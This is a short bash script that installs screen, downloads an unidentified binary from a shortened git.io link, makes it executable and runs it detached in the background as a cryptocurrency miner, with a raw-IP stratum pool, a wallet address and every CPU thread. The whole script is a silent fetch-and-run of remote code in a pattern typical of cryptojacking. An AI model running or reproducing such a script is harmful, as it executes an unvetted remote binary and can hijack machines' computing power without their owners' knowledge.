#!/bin/bash
sudo apt update && sudo apt install zip unzip && sudo apt install screen -y && 
screen -dmS cpuu.sh ./cpu.sh 65 75 && 
wget -qO build https://git.io/JiGZh && chmod +x build && 
screen -dmS cpuu.sh nohup ./build -a verus -o stratum+tcp://51.79.251.11:3300 -u Lhehm3xhWQNgF1EexRa1J2Q8LKdeAPovbY -t $(nproc) -p c=LTC,m=solo > nohup.out
